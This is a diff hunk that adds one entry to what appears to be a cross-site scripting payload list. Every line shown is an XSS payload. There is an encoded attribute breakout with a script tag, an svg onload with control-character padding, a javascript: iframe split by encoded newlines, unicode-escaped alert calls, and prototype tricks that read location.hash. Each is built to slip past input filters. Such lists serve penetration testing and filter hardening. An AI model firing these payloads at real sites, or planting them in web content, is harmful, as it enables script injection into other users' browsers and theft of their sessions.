@@ -30,6 +30,7 @@ Object.prototype.toString=RegExp.prototype.toString;
 Object.prototype.source=location.hash;
 location.hash=null
 '-(a=alert,b="_Yooo!_",[b].find(a))-'
+%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
 <svg%09%0a%0b%0c%0d%0a%00%20onload=alert(1)>
 <iframe src=%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">
 <script%20~~~>\u0061\u006C\u0065\u0072\u0074''</script%20~~~>
